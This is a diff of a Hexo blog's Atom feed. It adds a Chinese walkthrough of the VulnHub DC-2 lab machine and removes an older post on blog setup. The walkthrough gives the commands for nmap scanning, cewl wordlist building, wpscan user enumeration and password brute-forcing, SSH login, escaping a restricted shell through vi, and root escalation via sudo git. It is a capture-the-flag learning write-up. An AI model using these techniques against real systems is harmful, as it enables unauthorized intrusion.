@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://lmg66.github.io/"/>
-  <updated>2020-11-06T10:41:50.151Z</updated>
+  <updated>2020-11-07T10:17:22.166Z</updated>
   <id>https://lmg66.github.io/</id>
   
   <author>
@@ -15,6 +15,36 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>DC2-靶机</title>
+    <link href="https://lmg66.github.io/posts/d4cd.html"/>
+    <id>https://lmg66.github.io/posts/d4cd.html</id>
+    <published>2020-11-06T13:34:00.000Z</published>
+    <updated>2020-11-07T10:17:22.166Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>靶机下载地址:<a href="http://www.five86.com/downloads/DC-2.zip" target="_blank" rel="noopener">http://www.five86.com/downloads/DC-2.zip</a></p><h2 id="基本信息收集"><a href="#基本信息收集" class="headerlink" title="基本信息收集"></a>基本信息收集</h2><p>nmap基本扫描，发现ip地址192.168.124.146，开发端口80，使用的wordpress框架</p><pre><code>nmap -A 192.168.124.0/24</code></pre><pre><code>Nmap scan report for dc-2 (192.168.124.146)Host is up (0.00036s latency).Not shown: 999 closed portsPORT   STATE SERVICE VERSION80/tcp open  http    Apache httpd 2.4.10 ((Debian))|_http-generator: WordPress 4.7.10|_http-server-header: Apache/2.4.10 (Debian)|_http-title: DC-2 &amp;#8211; Just another WordPress site|_https-redirect: ERROR: Script execution failed (use -d to debug)MAC Address: 00:0C:29:94:8C:B4 (VMware)Device type: general purposeRunning: Linux 3.X|4.XOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4OS details: Linux 3.2 - 4.9Network Distance: 1 hop</code></pre><p>对端口进一步扫描,发现开发了7744端口(不清楚是什么服务，因该是ssh吧)：</p><pre><code>nmap -sS 192.168.124.146 -p 1-65535</code></pre><pre><code>Nmap scan report for dc-2 (192.168.124.146)Host is up (0.00094s latency).Not shown: 65533 closed portsPORT     STATE SERVICE80/tcp   open  http7744/tcp open  raqmon-pdu</code></pre><p>访问192.168.124.146发现访问不了，这里需要改下本地的dns</p><pre><code>linux:vim /etc/hostswindows:C:\Windows\System32\drivers\etc</code></pre><p><img src="/images/pasted-128.png" alt="upload successful"><br>访问果然是个wordpress框架<br><img src="/images/pasted-129.png" alt="upload successful"></p><h2 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h2><p>发现有flag,点进去，提示用cewl来获取密码，所有应该是爆破密码之类的，且提示自己的密码字典可能无效，且有时没法获得所有密码，提示用其他的身份去登录<br><img src="/images/pasted-130.png" alt="upload successful"></p><h2 id="那还说什么cewl搞起"><a href="#那还说什么cewl搞起" class="headerlink" title="那还说什么cewl搞起"></a>那还说什么cewl搞起</h2><p>cewl是通过爬行网站获取关键信息创建一个密码字典</p><pre><code>cewl http://dc-2/index.php/flag/ -w dict.txt-w 输出的文件名称</code></pre><p>发现主题是wordpress，那就扫描一下用户吧，提示密码了，因该是让登录<br>使用wpscan工具：</p><p>WPScan是Kali Linux默认自带的一款漏洞扫描工具，它采用Ruby编写，能够扫描WordPress网站中的多种安全漏洞，其中包括主题漏洞、插件漏洞和WordPress本身的漏洞。最新版本WPScan的数据库中包含超过18000种插件漏洞和2600种主题漏洞，并且支持最新版本的WordPress。值得注意的是，它不仅能够扫描类似robots.txt这样的敏感文件，而且还能够检测当前已启用的插件和其他功能。<br>该扫描器可以实现获取站点用户名，获取安装的所有插件、主题，以及存在漏洞的插件、主题，并提供漏洞信息。同时还可以实现对未加防护的Wordpress站点暴力破解用户名密码。</p><p>枚举一下用户,枚举出admin，jerry，tom</p><pre><code>wpscan --url http://dc-2 --enumerate u</code></pre><pre><code>[+] URL: http://dc-2/ [192.168.124.146][+] Started: Sat Nov  7 02:23:05 2020Interesting Finding(s):[+] Headers | Interesting Entry: Server: Apache/2.4.10 (Debian) | Found By: Headers (Passive Detection) | Confidence: 100%[+] XML-RPC seems to be enabled: http://dc-2/xmlrpc.php | Found By: Direct Access (Aggressive Detection) | Confidence: 100% | References: |  - http://codex.wordpress.org/XML-RPC_Pingback_API |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access[+] http://dc-2/readme.html | Found By: Direct Access (Aggressive Detection) | Confidence: 100%[+] The external WP-Cron seems to be enabled: http://dc-2/wp-cron.php | Found By: Direct Access (Aggressive Detection) | Confidence: 60% | References: |  - https://www.iplocation.net/defend-wordpress-from-ddos |  - https://github.com/wpscanteam/wpscan/issues/1299[+] WordPress version 4.7.10 identified (Insecure, released on 2018-04-03). | Found By: Rss Generator (Passive Detection) |  - http://dc-2/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=4.7.10&lt;/generator&gt; |  - http://dc-2/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=4.7.10&lt;/generator&gt;[+] WordPress theme in use: twentyseventeen | Location: http://dc-2/wp-content/themes/twentyseventeen/ | Last Updated: 2020-08-11T00:00:00.000Z | Readme: http://dc-2/wp-content/themes/twentyseventeen/README.txt | [!] The version is out of date, the latest version is 2.4 | Style URL: http://dc-2/wp-content/themes/twentyseventeen/style.css?ver=4.7.10 | Style Name: Twenty Seventeen | Style URI: https://wordpress.org/themes/twentyseventeen/ | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo... | Author: the WordPress team | Author URI: https://wordpress.org/ | | Found By: Css Style In Homepage (Passive Detection) | | Version: 1.2 (80% confidence) | Found By: Style (Passive Detection) |  - http://dc-2/wp-content/themes/twentyseventeen/style.css?ver=4.7.10, Match: &#39;Version: 1.2&#39;[+] Enumerating Users (via Passive and Aggressive Methods) Brute Forcing Author IDs - Time: 00:00:00 &lt;====================================================&gt; (10 / 10) 100.00% Time: 00:00:00[i] User(s) Identified:[+] admin | Found By: Rss Generator (Passive Detection) | Confirmed By: |  Wp Json Api (Aggressive Detection) |   - http://dc-2/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection) |  Login Error Messages (Aggressive Detection)[+] jerry | Found By: Wp Json Api (Aggressive Detection) |  - http://dc-2/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1 | Confirmed By: |  Author Id Brute Forcing - Author Pattern (Aggressive Detection) |  Login Error Messages (Aggressive Detection)[+] tom | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection)[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up</code></pre><p>爆破一下用户名和密码<br>touch users.txt<br>将用户名admin，jerry，tom存入<br>用刚刚抓取的密码字典和用户字典进行爆破</p><pre><code>wpscan --url http://dc-2/ -U users.txt -P dict.txt</code></pre><pre><code>[!] Valid Combinations Found: | Username: jerry, Password: adipiscing | Username: tom, Password: parturient</code></pre><p>成功爆破出了两个用户名和密码，没有admin的<br><img src="/images/pasted-131.png" alt="upload successful"></p><h2 id="尝试登录，登录成功，且在page中发现flag2"><a href="#尝试登录，登录成功，且在page中发现flag2" class="headerlink" title="尝试登录，登录成功，且在page中发现flag2"></a>尝试登录，登录成功，且在page中发现flag2</h2><p><img src="/images/pasted-133.png" alt="upload successful"><br>提示无法利用wordpress采取捷径，尝试令一种方法，之前nmap扫描出了7744端口，那么我们是不是可以尝试ssh登录<br>发现使用tom账号登录成功</p><pre><code>ssh tom@192.168.124.146 -p 7744password:parturient</code></pre><h2 id="尝试读取文件"><a href="#尝试读取文件" class="headerlink" title="尝试读取文件"></a>尝试读取文件</h2><p><img src="/images/pasted-134.png" alt="upload successful"><br>发现被rbash，也就是说是被受限的shell<br>参考链接:<a href="https://www.freebuf.com/articles/system/188989.html" target="_blank" rel="noopener">freebuf</a></p><p>先尝试”/“能不能用</p><p><img src="/images/pasted-136.png" alt="upload successful"><br>cp命令</p><p><img src="/images/pasted-137.png" alt="upload successful"><br>FTP,GDB,main,git没有，发现vi可以用，那就试试被</p><pre><code>vi testset shell=/bin/shshell</code></pre><p><img src="/images/pasted-138.png" alt="upload successful"></p><p><img src="/images/pasted-139.png" alt="upload successful"></p><p><img src="/images/pasted-140.png" alt="upload successful"></p><p>更改PATH或SHELL环境变量</p><pre><code>查看export -p</code></pre><pre><code>export HOME=&#39;/home/tom&#39;                                                                                                           export LANG=&#39;en_US.UTF-8&#39;                                                                                                         export LOGNAME=&#39;tom&#39;                                                                                                              export MAIL=&#39;/var/mail/tom&#39;                                                                                                       export PATH=&#39;/home/tom/usr/bin&#39;                                                                                                   export PWD=&#39;/home/tom&#39;export SHELL=&#39;/bin/rbash&#39;export SHLVL=&#39;1&#39;export SSH_CLIENT=&#39;192.168.124.139 51336 7744&#39;export SSH_CONNECTION=&#39;192.168.124.139 51336 192.168.124.146 7744&#39;export SSH_TTY=&#39;/dev/pts/1&#39;export TERM=&#39;xterm-256color&#39;export USER=&#39;tom&#39;export VIM=&#39;/usr/share/vim&#39;export VIMRUNTIME=&#39;/usr/share/vim/vim74&#39;export _=&#39;whoami&#39;</code></pre><p>修改path</p><pre><code>export PATH=&quot;/usr/sbin:/usr/bin:/rbin:/bin&quot;</code></pre><p>打开flag3.txt发现，提示要切换用户到jerry<br><img src="/images/pasted-141.png" alt="upload successful"></p><h2 id="切换用户，home发现flag4"><a href="#切换用户，home发现flag4" class="headerlink" title="切换用户，home发现flag4"></a>切换用户，home发现flag4</h2><p><img src="/images/pasted-142.png" alt="upload successful"></p><p>Good to see that you’ve made it this far - but you’re not home yet.                                                               </p><p>You still need to get the final flag (the only flag that really counts!!!).                                                       </p><p>No hints here - you’re on your own now.  :-)                                                                                      </p><p>Go on - git outta here!!!!</p><h2 id="这里提示git提权"><a href="#这里提示git提权" class="headerlink" title="这里提示git提权"></a>这里提示git提权</h2><pre><code>sudo git help config</code></pre><p><img src="/images/pasted-143.png" alt="upload successful"><br>成功获取root权限，读取文件</p><p><img src="/images/pasted-146.png" alt="upload successful"></p><p>Congratulatons!!!</p><p>A special thanks to all those who sent me tweets<br>and provided me with feedback - it’s all greatly<br>appreciated.</p><p>If you enjoyed this CTF, send me a tweet via @DCAU7.</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.cnblogs.com/zaqzzz/p/12075132.html#1suid%E6%8F%90%E6%9D%83" target="_blank" rel="noopener">linux提权</a></p><p><a href="https://www.freebuf.com/articles/system/188989.html" target="_blank" rel="noopener">freebuf</a></p><p><a href="https://blog.csdn.net/qq_41453285/article/details/100898310" target="_blank" rel="noopener">wpscan</a></p><p><a href="https://www.cnblogs.com/yurang/p/12735229.html" target="_blank" rel="noopener"> vulnhub: DC 2</a></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h2 id=&quot;环境搭建&quot;&gt;&lt;a href=&quot;#环境搭建&quot; class=&quot;headerlink&quot; title=&quot;环境搭建&quot;&gt;&lt;/a&gt;环境搭建&lt;/h2&gt;&lt;p&gt;靶机下载地址:&lt;a href=&quot;http://www.five86.com/downloads/DC-2.zip&quot; targ
+      
+    
+    </summary>
+    
+    
+      <category term="web安全" scheme="https://Lmg66.github.io/categories/web%E5%AE%89%E5%85%A8/"/>
+    
+      <category term="内网渗透" scheme="https://Lmg66.github.io/categories/web%E5%AE%89%E5%85%A8/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
+    
+    
+      <category term="靶场" scheme="https://Lmg66.github.io/tags/%E9%9D%B6%E5%9C%BA/"/>
+    
+      <category term="DC" scheme="https://Lmg66.github.io/tags/DC/"/>
+    
+  </entry>
   
   <entry>
     <title>DC1-靶机</title>
@@ -529,32 +559,6 @@
       <category term="文件包含" scheme="https://Lmg66.github.io/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
     
       <category term="php伪协议" scheme="https://Lmg66.github.io/tags/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>两种搭建个人博客方法</title>
-    <link href="https://lmg66.github.io/posts/2f31.html"/>
-    <id>https://lmg66.github.io/posts/2f31.html</id>
-    <published>2020-03-24T13:28:23.000Z</published>
-    <updated>2020-03-24T13:31:53.403Z</updated>
-    
-    <content type="html"><![CDATA[<h3 id="前言-整了一个阿里云的服务器-不过没用上-，想着搭一个博客，记录自己菜鸡的日常，中间走了很多弯路，浪费了不少时间，下面是我总结的两种搭建博客的快捷方法，希望能帮到你"><a href="#前言-整了一个阿里云的服务器-不过没用上-，想着搭一个博客，记录自己菜鸡的日常，中间走了很多弯路，浪费了不少时间，下面是我总结的两种搭建博客的快捷方法，希望能帮到你" class="headerlink" title="前言:整了一个阿里云的服务器(不过没用上)，想着搭一个博客，记录自己菜鸡的日常，中间走了很多弯路，浪费了不少时间，下面是我总结的两种搭建博客的快捷方法，希望能帮到你"></a>前言:整了一个阿里云的服务器(不过没用上)，想着搭一个博客，记录自己菜鸡的日常，中间走了很多弯路，浪费了不少时间，下面是我总结的两种搭建博客的快捷方法，希望能帮到你</h3><h1 id="方法一-个人服务器-宝塔-wordpress"><a href="#方法一-个人服务器-宝塔-wordpress" class="headerlink" title="方法一:个人服务器+宝塔+wordpress"></a>方法一:个人服务器+宝塔+wordpress</h1><hr><h2 id="方法一-优势"><a href="#方法一-优势" class="headerlink" title="方法一:优势"></a>方法一:优势</h2><ol><li>可拓展性强，可以添加论坛，个人游戏等等的个人项目</li><li>操作简单，wordpress后台是图形化页面</li><li>国内访问速度较快</li></ol><h2 id="方法一-劣势"><a href="#方法一-劣势" class="headerlink" title="方法一:劣势"></a>方法一:劣势</h2><ol><li>域名需要实名，服务器需要备案(大陆)，大概需要小半个月</li><li>需要费用，大概200元/年(学生优惠)</li><li>可能服务器被攻击，需要打补丁和后期维护</li></ol><h3 id="如果想用这种方法搭建个人博客，推荐一个我找了很久的很好的视频b站小游-他的主题也很好看可以使用，看他的视频完全够用了"><a href="#如果想用这种方法搭建个人博客，推荐一个我找了很久的很好的视频b站小游-他的主题也很好看可以使用，看他的视频完全够用了" class="headerlink" title="如果想用这种方法搭建个人博客，推荐一个我找了很久的很好的视频b站小游,他的主题也很好看可以使用，看他的视频完全够用了"></a>如果想用这种方法搭建个人博客，推荐一个我找了很久的很好的视频<a href="https://www.bilibili.com/video/BV1j4411C7Qf" target="_blank" rel="noopener">b站小游</a>,他的主题也很好看可以使用，看他的视频完全够用了</h3><hr><h1 id="方法二-基于github-码云-coding搭建-hexo"><a href="#方法二-基于github-码云-coding搭建-hexo" class="headerlink" title="方法二:基于github/码云/coding搭建+hexo"></a>方法二:基于github/码云/coding搭建+hexo</h1><hr><h2 id="方法二-优势"><a href="#方法二-优势" class="headerlink" title="方法二:优势"></a>方法二:优势</h2><ol><li>免费不用域名也不用服务器，如果你想自定义域名也可以绑定</li><li>不用担心网站被攻击，因为是是纯静态页面</li></ol><h2 id="方法二-劣势"><a href="#方法二-劣势" class="headerlink" title="方法二:劣势"></a>方法二:劣势</h2><ol><li>可拓展性差，因为没法数据交互，不过如果只是整博客完全够用</li><li>访问速度可能会慢些，github你懂的，推荐使用国内类似github的码云来搭建，访问速度还是可以的</li><li>需要学习的要多一些(一些基础的git，Markdown ，css，js，html)，没有图形化页面需要面对源码进行美化和发布文章</li></ol><h3 id="如果想用这种方法搭建个人博客，推荐我看的教程博客很不错过客-我的github也有我博客的源码，其他的需要啥自行百度"><a href="#如果想用这种方法搭建个人博客，推荐我看的教程博客很不错过客-我的github也有我博客的源码，其他的需要啥自行百度" class="headerlink" title="如果想用这种方法搭建个人博客，推荐我看的教程博客很不错过客,我的github也有我博客的源码，其他的需要啥自行百度"></a>如果想用这种方法搭建个人博客，推荐我看的教程博客很不错<a href="https://yafine-blog.cn/posts/4ab2.html" target="_blank" rel="noopener">过客</a>,我的github也有我博客的源码，其他的需要啥自行百度</h3><hr><h3 id="好的就这些，因为还没弄图床没法发图片都这样吧，具体问题可以留言，评论，私聊我qq"><a href="#好的就这些，因为还没弄图床没法发图片都这样吧，具体问题可以留言，评论，私聊我qq" class="headerlink" title="好的就这些，因为还没弄图床没法发图片都这样吧，具体问题可以留言，评论，私聊我qq"></a>好的就这些，因为还没弄图床没法发图片都这样吧，具体问题可以留言，评论，私聊我qq</h3>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h3 id=&quot;前言-整了一个阿里云的服务器-不过没用上-，想着搭一个博客，记录自己菜鸡的日常，中间走了很多弯路，浪费了不少时间，下面是我总结的两种搭建博客的快捷方法，希望能帮到你&quot;&gt;&lt;a href=&quot;#前言-整了一个阿里云的服务器-不过没用上-，想着搭一个博客，记录自己菜鸡的日
-      
-    
-    </summary>
-    
-    
-      <category term="博客" scheme="https://Lmg66.github.io/categories/%E5%8D%9A%E5%AE%A2/"/>
-    
-    
-      <category term="个人博客的搭建" scheme="https://Lmg66.github.io/tags/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E7%9A%84%E6%90%AD%E5%BB%BA/"/>
     
   </entry>
   
